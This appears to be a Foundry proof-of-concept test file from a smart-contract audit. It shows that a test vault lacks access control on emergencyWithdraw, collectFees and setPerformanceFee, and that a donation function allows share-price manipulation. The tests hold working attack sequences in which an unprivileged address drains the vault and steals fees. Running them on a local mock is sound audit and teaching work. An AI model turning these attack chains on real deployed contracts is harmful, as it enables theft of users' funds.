// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title AccessControlExploit
 * @notice Proof of Concept: Missing access control vulnerabilities
 * @dev Demonstrates C-02 and C-04 from severity table
 */
contract AccessControlExploit is Test {
    VulnerableVault public vault;
    MockERC20 public token;

    address public admin = address(0x1);
    address public user1 = address(0x2);
    address public attacker = address(0xBAD);

    uint256 constant INITIAL_BALANCE = 1000 ether;
    uint256 constant USER_DEPOSIT = 100 ether;

    function setUp() public {
        // Deploy token and vault
        token = new MockERC20("Test Token", "TEST");

        vm.prank(admin);
        vault = new VulnerableVault(
            address(token),
            "Vault Shares",
            "vTEST"
        );

        // Give tokens to users
        token.mint(user1, INITIAL_BALANCE);
        token.mint(admin, INITIAL_BALANCE);

        // User deposits
        vm.startPrank(user1);
        token.approve(address(vault), USER_DEPOSIT);
        vault.deposit(USER_DEPOSIT);
        vm.stopPrank();

        console.log("=== Initial Setup ===");
        console.log("Vault admin:", vault.admin());
        console.log("Vault balance:", token.balanceOf(address(vault)));
        console.log("User1 shares:", vault.balanceOf(user1));
    }

    function testEmergencyWithdrawNoAccessControl() public {
        uint256 vaultBalanceBefore = token.balanceOf(address(vault));
        uint256 attackerBalanceBefore = token.balanceOf(attacker);

        console.log("\n=== Testing emergencyWithdraw() Access Control ===");
        console.log("Attacker is NOT admin");
        console.log("Vault balance before:", vaultBalanceBefore);
        console.log("Attacker balance before:", attackerBalanceBefore);

        // Attacker (not admin) calls emergencyWithdraw
        vm.prank(attacker);
        vault.emergencyWithdraw();

        uint256 vaultBalanceAfter = token.balanceOf(address(vault));
        uint256 attackerBalanceAfter = token.balanceOf(attacker);

        console.log("\n=== After Attack ===");
        console.log("Vault balance after:", vaultBalanceAfter);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Stolen amount:", attackerBalanceAfter - attackerBalanceBefore);

        // Verify exploit
        assertEq(vaultBalanceAfter, 0, "Vault should be empty");
        assertEq(attackerBalanceAfter, vaultBalanceBefore, "Attacker should have all funds");

        console.log("\n=== CRITICAL: Anyone can drain vault! ===");
    }

    function testCollectFeesNoAccessControl() public {
        // First, some fees need to accumulate
        // The vault has performanceFee = 100 (1%)
        uint256 vaultBalance = token.balanceOf(address(vault));
        uint256 expectedFees = (vaultBalance * vault.performanceFee()) / 10000;

        console.log("\n=== Testing collectFees() Access Control ===");
        console.log("Expected fees:", expectedFees);
        console.log("Attacker is NOT admin");

        uint256 attackerBalanceBefore = token.balanceOf(attacker);

        // Attacker (not admin) collects fees
        vm.prank(attacker);
        vault.collectFees();

        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        uint256 stolenFees = attackerBalanceAfter - attackerBalanceBefore;

        console.log("\n=== After Attack ===");
        console.log("Attacker balance before:", attackerBalanceBefore);
        console.log("Attacker balance after:", attackerBalanceAfter);
        console.log("Stolen fees:", stolenFees);

        assertEq(stolenFees, expectedFees, "Attacker should have collected fees");

        console.log("\n=== CRITICAL: Anyone can steal protocol fees! ===");
    }

    function testSetPerformanceFeeNoAccessControl() public {
        uint256 originalFee = vault.performanceFee();
        uint256 maliciousFee = 10000; // 100% fee!

        console.log("\n=== Testing setPerformanceFee() Access Control ===");
        console.log("Original fee:", originalFee, "basis points");
        console.log("Attacker setting fee to:", maliciousFee, "basis points (100%)");

        // Attacker sets fee to 100%
        vm.prank(attacker);
        vault.setPerformanceFee(maliciousFee);

        uint256 newFee = vault.performanceFee();
        console.log("New fee:", newFee, "basis points");

        assertEq(newFee, maliciousFee, "Fee should be changed");

        // Now attacker can collect huge fees
        vm.prank(attacker);
        vault.collectFees();

        uint256 attackerBalance = token.balanceOf(attacker);
        console.log("\n=== After Setting 100% Fee and Collecting ===");
        console.log("Attacker balance:", attackerBalance);

        console.log("\n=== CRITICAL: Anyone can set fees to 100% and drain vault! ===");
    }

    function testCombinedAttackChain() public {
        console.log("\n=== Combined Attack: Fee Manipulation + Collection ===");

        uint256 vaultBalanceBefore = token.balanceOf(address(vault));
        console.log("Vault balance:", vaultBalanceBefore);

        vm.startPrank(attacker);

        // Step 1: Set fee to maximum (100%)
        vault.setPerformanceFee(10000);
        console.log("Step 1: Set fee to 100%");

        // Step 2: Collect the massive fees
        vault.collectFees();
        console.log("Step 2: Collect fees");

        uint256 attackerBalance = token.balanceOf(attacker);
        uint256 vaultBalanceAfter = token.balanceOf(address(vault));

        console.log("\n=== Attack Complete ===");
        console.log("Vault balance after:", vaultBalanceAfter);
        console.log("Attacker gained:", attackerBalance);
        console.log("Percentage stolen:", (attackerBalance * 100) / vaultBalanceBefore, "%");

        vm.stopPrank();

        // Verify attacker got the funds
        assertGt(attackerBalance, 0, "Attacker should have stolen fees");
        assertLt(vaultBalanceAfter, vaultBalanceBefore, "Vault should have less funds");

        console.log("\n=== CRITICAL: Complete fee theft possible in 2 transactions! ===");
    }

    function testDonationAttackVector() public {
        // This tests the donation function which has no access control
        // and can be used for share price manipulation

        uint256 donationAmount = 50 ether;
        token.mint(attacker, donationAmount);

        uint256 sharesBefore = vault.convertToShares(1 ether);
        console.log("\n=== Testing donateToVault() ===");
        console.log("Share price before (for 1 ETH):", sharesBefore);

        vm.startPrank(attacker);
        token.approve(address(vault), donationAmount);
        vault.donateToVault(donationAmount);
        vm.stopPrank();

        uint256 sharesAfter = vault.convertToShares(1 ether);
        console.log("Share price after donation (for 1 ETH):", sharesAfter);
        console.log("Donation amount:", donationAmount);

        assertLt(sharesAfter, sharesBefore, "Share price should be inflated");

        console.log("\n=== WARNING: Anyone can manipulate share price via donation! ===");
    }
}

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}
